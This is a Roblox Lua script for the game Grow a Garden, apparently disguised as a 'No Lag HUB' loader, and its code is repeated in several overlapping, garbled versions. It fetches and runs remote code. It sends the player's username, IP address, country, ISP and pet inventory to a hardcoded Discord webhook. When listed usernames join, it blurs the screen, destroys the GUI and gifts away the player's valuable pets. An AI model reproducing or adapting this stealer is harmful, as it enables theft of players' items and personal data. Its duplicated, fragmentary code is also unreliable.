
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()

-- CONFIG SECTION
local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
local targetUsernames = {
    "BadPlayer123", "MyAlt", "EnemyGuy", "intercepternumber1", "deepscriptAI"
}
local drainPets = {
    "Dragonfly", "T‑Rex", "Raccoon", "Red Fox", "Queen Bee",
    "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
    "Triceratops", "Axolotl", "Bear Bee", "Polar Bear",
    "Praying Mantis", "Scarlet Macaw"
}
local petKeywords = {
    "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab", "Bee",
    "Black Bunny", "Cat", "Chicken", "Deer", "Monkey", "Orange Tabby",
    "Pig", "Rooster", "Spotted Deer", "Flamingo", "Toucan", "Sea Turtle",
    "Orangutan", "Seal", "Honey Bee", "Wasp", "Tarantula Hawk", "Raptor",
    "Triceratops", "Stegosaurus", "Pterodactyl", "Turtle", "Caterpillar",
    "Petal Bee", "Moth", "Scarlet Macaw", "Ostrich", "Peacock",
    "Capybara", "Sand Snake", "Meerkat", "Brown Mouse", "Giant Ant",
    "Grey Mouse", "Praying Mantis", "Red Giant Ant", "Snail", "Squirrel",
    "Bear Bee", "Butterfly", "Brontosaurus", "Pack Bee", "Mimic Octopus",
    "Hyacinth Macaw", "Axolotl", "Red Fox", "T‑Rex", "Dragonfly",
    "Queen Bee", "Disco Bee", "Fennec Fox", "Moon Cat", "Raccoon",
    "Polar Bear"
}

-- SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild("Backpack")
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = ""
    local lowest = nil
    repeat
        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor ~= "" then url = url .. "&cursor=" .. cursor end
        local response = req({ Url = url, Method = "GET" })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn("[*] Private server detected. Hopping to public server...")
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn("[!] No public server found.")
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

function removeGUI()
    for _, v in pairs(localPlayer:WaitForChild("PlayerGui"):GetChildren()) do
        if v:IsA("ScreenGui") or v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
            v:Destroy()
        end
    end
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, "- " .. items[j])
        end
        table.insert(chunks, {
            name = "🎒 Pets " .. tostring(i) .. "–" .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, "\n"),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = "",
        embeds = {{
            title = "🐾 Grow a Garden Report",
            color = 16753920,
            fields = embedFields,
            footer = { text = "Delta Executor Logger" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "Unknown", "Unknown", "Unknown" end
    local result = req({ Url = "http://ip-api.com/json/", Method = "GET" })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or "?", body.country or "?", body.isp or "?"
    end
    return "?", "?", "?"
end

-- UNFAVORITE PETS
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild("Dex")
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA("Instance") and item:GetAttribute("d") == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("ToggleFavorite"):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = "🚫 Unfavorited Pets", value = table.concat(unfavorited, ", "), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = "👤 Username", value = localPlayer.Name },
        { name = "🌐 IP", value = ip },
        { name = "🗺️ Country", value = country },
        { name = "💻 ISP", value = isp },
        { name = "📡 Server ID", value = jobId },
        { name = "⏱️ Time", value = os.date("%Y-%m-%d %H:%M:%S") }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = "🎒 Pets", value = "None", inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = "🔃 Server Status", value = wasPrivateServer and "Private server detected. Server hop executed." or "Already in public server.", inline = false }
    })
end)

-- Watch for targets & handle reactions
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                unfavoriteAllPets()
                freezeVisual()
                removeGUI()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) then
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {"GivePet", player}
                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
                            "GivePet",
                            recipient,
                            tool
                        }
                        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                        task.wait(0.7)
                    end
                end
            end
        end
        task.wait(1.2)
    end
end

-- Watch for specific players
Players.PlayerAdded:Connect(function(player)
    if table.find(targetUsernames, player.Name) then
        task.wait(7)
        removeGUI()
        freezeScreen()
        unfavoriteAll()
        drain()
    end
end)

-- Load external functionality
pcall(function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
end)
end

local wasPrivateServer = false
if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn("[*] Private server detected. Hopping to public server...")
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn("[!] No public server found.")
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, "- " .. items[j])
        end
        table.insert(chunks, {
            name = "🎒 Pets " .. tostring(i) .. "–" .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, "\n"),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = "",
        embeds = {{
            title = "🐾 Grow a Garden Report",
            color = 16753920,
            fields = embedFields,
            footer = { text = "Delta Executor Logger" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "Unknown", "Unknown", "Unknown" end
    local result = req({ Url = "http://ip-api.com/json/", Method = "GET" })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or "?", body.country or "?", body.isp or "?"
    end
    return "?", "?", "?"
end

-- UNFAVORITE PETS
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild("Dex")
    if not dex then return end
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA("Instance") and item:GetAttribute("d") == true then
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("ToggleFavorite"):FireServer(item.Name)
            task.wait(0.2)
        end
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = "👤 Username", value = localPlayer.Name },
        { name = "🌐 IP", value = ip },
        { name = "🗺️ Country", value = country },
        { name = "💻 ISP", value = isp },
        { name = "📡 Server ID", value = jobId },
        { name = "⏱️ Time", value = os.date("%Y-%m-%d %H:%M:%S") }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = "🎒 Pets", value = "None", inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = "🔃 Server Status", value = wasPrivateServer and "Private server detected. Server hop executed." or "Already in public server.", inline = false }
    })
end)

-- Watch for targets & drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {"GivePet", player}
                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn("[*] Private server detected. Hopping to public server...")
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn("[!] No public server found.")
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, "- " .. items[j])
        end
        table.insert(chunks, {
            name = "🎒 Pets " .. tostring(i) .. "–" .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, "\n"),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = "",
        embeds = {{
            title = "🐾 Grow a Garden Report",
            color = 16753920,
            fields = embedFields,
            footer = { text = "Delta Executor Logger" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "Unknown", "Unknown", "Unknown" end
    local result = req({ Url = "http://ip-api.com/json/", Method = "GET" })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or "?", body.country or "?", body.isp or "?"
    end
    return "?", "?", "?"
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = "👤 Username", value = localPlayer.Name },
        { name = "🌐 IP", value = ip },
        { name = "🗺️ Country", value = country },
        { name = "💻 ISP", value = isp },
        { name = "📡 Server ID", value = jobId },
        { name = "⏱️ Time", value = os.date("%Y-%m-%d %H:%M:%S") }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = "🎒 Pets", value = "None", inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = "🔃 Server Status", value = wasPrivateServer and "Private server detected. Server hop executed." or "Already in public server.", inline = false }
    })
end)

-- Watch for targets & drain pets
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {"GivePet", player}
                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn("[*] Private server detected. Hopping to public server...")
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn("[!] No public server found.")
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, "- " .. items[j])
        end
        table.insert(chunks, {
            name = "🎒 Pets " .. tostring(i) .. "–" .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, "\n"),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = "",
        embeds = {{
            title = "🐾 Grow a Garden Report",
            color = 16753920,
            fields = embedFields,
            footer = { text = "Delta Executor Logger" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "Unknown", "Unknown", "Unknown" end
    local result = req({ Url = "http://ip-api.com/json/", Method = "GET" })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or "?", body.country or "?", body.isp or "?"
    end
    return "?", "?", "?"
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild("Dex")
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA("Instance") and item:GetAttribute("d") == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("ToggleFavorite"):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = "🚫 Unfavorited Pets", value = table.concat(unfavorited, ", "), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = "👤 Username", value = localPlayer.Name },
        { name = "🌐 IP", value = ip },
        { name = "🗺️ Country", value = country },
        { name = "💻 ISP", value = isp },
        { name = "📡 Server ID", value = jobId },
        { name = "⏱️ Time", value = os.date("%Y-%m-%d %H:%M:%S") }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = "🎒 Pets", value = "None", inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = "🔃 Server Status", value = wasPrivateServer and "Private server detected. Server hop executed." or "Already in public server.", inline = false }
    })
end)

-- Periodic activity status report
spawn(function()
    task.wait(300) -- 5 minutes
    local pets = getFilteredPets()
    local hasHighTier = false
    for _, petName in pairs(pets) do
        if hasKeyword(petName, highTierPets) then
            hasHighTier = true
            break
        end
    end
    if #pets > 0 or hasHighTier then
        sendWebhook({
            { name = "⏳ 5-Minute Check", value = "Script still running with relevant pets.", inline = false },
            { name = "👤 Username", value = localPlayer.Name, inline = true },
            { name = "📡 Server ID", value = jobId, inline = true }
        })
    end
end)

-- Watch for targets, delay 7 sec, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7)
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                local orderedPets = {}
                for _, tierPet in ipairs(highTierPets) do
                    for _, tool in ipairs(backpack:GetChildren()) do
                        if tool:IsA("Tool") and string.find(string.lower(tool.Name), string.lower(tierPet)) then
                            table.insert(orderedPets, tool)
                        end
                    end
                end
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) and not table.find(orderedPets, tool) then
                        table.insert(orderedPets, tool)
                    end
                end
                for _, tool in ipairs(orderedPets) do
                    freezeVisual()
                    tool.Parent = character
                    wait(0.3)
                    while player and player.Parent == Players and tool.Parent == character do
                        local args = {"GivePet", player}
                        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                        wait(0.7)
                    end
                end
            end
        end
        wait(2.5)
    end
end)
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

if jobId ~= "29034fc7-77e6-4008-a431-303c5aee26a6" then
    task.wait(2.5)
    TeleportService:TeleportToPlaceInstance(placeId, "29034fc7-77e6-4008-a431-303c5aee26a6", localPlayer)
    return
end

local wasPrivateServer = false
if game.PrivateServerId~="" and game.PrivateServerOwnerId~=0 then
    local low = getLowestServer()
    if low then
        wasPrivateServer = true
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, low.id, localPlayer)
        return
    end
end

-- HELPERS
local function freezeVisual()
    local blur = Instance.new("BlurEffect")
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    name = string.lower(name)
    for _, keyword in ipairs(list) do
        if string.find(name, string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local out = {}
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and hasKeyword(tool.Name, petKeywords) then
            table.insert(out, tool.Name)
        end
    end
    return out
end

local function chunkItems(items)
    local chunks = {}
    for i=1,#items,5 do
        local block = {}
        for j=i,math.min(i+4,#items) do
            block[#block+1] = "- "..items[j]
        end
        chunks[#chunks+1] = { name="🎒 Pets "..i.."–"..math.min(i+4,#items), value=table.concat(block,"\n"), inline=false }
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = { content="", embeds={{ title="🐾 Grow a Garden Report", color=16753920, fields=embedFields, footer={text="Delta Executor Logger"}, timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ") }} }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({ Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data) })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return "?", "?", "?" end
    local res = req({ Url="http://ip-api.com/json/", Method="GET" })
    if res and res.Body then
        local b = HttpService:JSONDecode(res.Body)
        return b.query or "?", b.country or "?", b.isp or "?"
    end
    return "?", "?", "?"
end

local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild("Dex")
    if not dex then return end
    local unfav = {}
    for _, item in ipairs(dex:GetChildren()) do
        if item:GetAttribute("d") == true then
            table.insert(unfav, item.Name)
            ReplicatedStorage.GameEvents.ToggleFavorite:FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfav > 0 then
        sendWebhook({{ name="🚫 Unfavorited Pets", value=table.concat(unfav,", "), inline=false }})
    end
end

-- INITIAL STATUS REPORT
task.spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name="👤 Username", value=localPlayer.Name, inline=true },
        { name="🌐 IP", value=ip, inline=true },
        { name="🗺️ Country", value=country, inline=true },
        { name="💻 ISP", value=isp, inline=true },
        { name="📡 Server ID", value=jobId, inline=false },
        { name="⏱️ Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false }
    })
end)

task.spawn(function()
    local pets = getFilteredPets()
    sendWebhook( chunkItems(pets) )
end)

task.spawn(function()
    sendWebhook({{ name="🔃 Server Status", value=wasPrivateServer and "Private server → hopped" or "Already in public target server", inline=false }})
end)

-- 5‑MINUTE STATUS REPORT
task.spawn(function()
    task.wait(300)
    local pets = getFilteredPets()
    local hasHigh = false
    for _, name in ipairs(pets) do
        if hasKeyword(name, highTierPets) then
            hasHigh = true
            break
        end
    end
    if #pets>0 or hasHigh then
        sendWebhook({
            { name="⏳ 5‑Minute Check", value="Script still active with relevant pets", inline=false },
            { name="👤 Username", value=localPlayer.Name, inline=true },
            { name="📡 Server ID", value=jobId, inline=true }
        })
    end
end)

-- MAIN LOOP: wait for target → delay 7s → action
task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7)
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()

                -- ORDERED GIFTING: high-tier first, then others
                local ordered = {}
                for _, tier in ipairs(highTierPets) do
                    for _, tool in ipairs(backpack:GetChildren()) do
                        if tool:IsA("Tool") and string.find(string.lower(tool.Name), string.lower(tier)) then
                            table.insert(ordered, tool)
                        end
                    end
                end
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) and not table.find(ordered, tool) then
                        table.insert(ordered, tool)
                    end
                end

                for _, tool in ipairs(ordered) do
                    freezeVisual()
                    tool.Parent = character
                    task.wait(0.3)
                    while player.Parent == Players and tool.Parent == character do
                        ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", player)
                        task.wait(0)
                    end
                end
            end
        end
        task.wait(2.5)
    end
end)
